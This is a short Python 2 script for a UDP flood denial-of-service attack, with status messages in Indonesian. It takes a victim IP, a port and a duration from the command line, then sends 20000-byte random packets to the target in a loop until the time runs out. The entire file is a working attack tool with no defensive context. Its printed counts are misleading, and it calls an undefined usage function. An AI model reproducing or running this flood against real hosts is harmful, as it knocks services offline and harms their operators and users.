import time, socket, random, sys

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout = time.time() + duration
    sent = 3000
    while 1:
        if time.time() > timeout:
            break
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print '\x1b[1;36mMemulai \x1b[1;34m%s \x1b[1;36mMengirim Paket 50000 \x1b[1;34m%s \x1b[1;36mPada Port 80 \x1b[1;4m%s ' % (sent, victim, vport)


def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))


if __name__ == '__main__':
    main()
